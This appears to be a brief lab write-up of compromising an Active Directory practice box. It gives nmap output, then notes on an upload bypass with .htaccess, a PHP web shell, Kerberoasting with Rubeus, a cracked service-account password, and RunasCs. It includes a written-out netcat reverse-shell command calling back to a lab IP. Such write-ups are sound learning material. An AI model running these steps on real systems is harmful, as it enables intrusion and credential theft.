53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-title: Access The Event
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-19 15:56:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: Access The Event
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2026-07-19T15:56:50
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

buy tickets, use file extention bypass, couldnt run the rev shell though
<img width="504" height="352" alt="image" src="https://github.com/user-attachments/assets/1e5b4708-0d04-4d90-b86e-ef0d1974c4b6" />

uploading .htaccess via burpsuite
c<img width="616" height="91" alt="image" src="https://github.com/user-attachments/assets/c888be4a-42fe-4b60-a9da-84a80acfa243" />

uploaded ivan php shell
<img width="369" height="51" alt="image" src="https://github.com/user-attachments/assets/4f291e02-b2dc-47d0-aaa6-98c46fcd530c" />

<img width="392" height="33" alt="image" src="https://github.com/user-attachments/assets/931911f1-48a9-4280-a884-76fb4a2cb78d" />


kerb?
<img width="1407" height="136" alt="image" src="https://github.com/user-attachments/assets/1f8beda1-5339-43dd-bd3b-e26d58b1d8b7" />

because service account svc_mssql can kerberoast
.\rubeus.exe kerberoast /nowrap
<img width="1917" height="641" alt="image" src="https://github.com/user-attachments/assets/b3f2073c-fe45-414d-b9c8-9839582f2b72" />

cracked. trustno1
<img width="1906" height="199" alt="image" src="https://github.com/user-attachments/assets/705f73c6-01a3-4776-b88d-43ab75133cd5" />

used runascs
<img width="1311" height="86" alt="image" src="https://github.com/user-attachments/assets/ee3d4ace-55d7-485b-9ad3-85461c287ca5" />

send nc.exe over and run
Invoke-RunasCs svc_mssql trustno1 "c:/xampp/htdocs/uploads/nc.exe 192.168.45.167 4444 -e cmd.exe"
<img width="1236" height="72" alt="image" src="https://github.com/user-attachments/assets/a2d7ea3a-31ac-4ee7-a366-903bf040431d" />
<img width="342" height="68" alt="image" src="https://github.com/user-attachments/assets/a8727453-0d8e-45ae-a232-cc2d68fa17f5" />
<img width="423" height="88" alt="image" src="https://github.com/user-attachments/assets/1827d2a1-c762-4205-bda2-abeefd738aa8" />

whoami /priv
<img width="644" height="126" alt="image" src="https://github.com/user-attachments/assets/2fa13f26-48be-49fe-a9ad-973e5427954d" />

use SeManageVolumePrivilege exploit
<img width="512" height="77" alt="image" src="https://github.com/user-attachments/assets/d39352ed-a054-438a-aee2-fec884b7d4c2" />



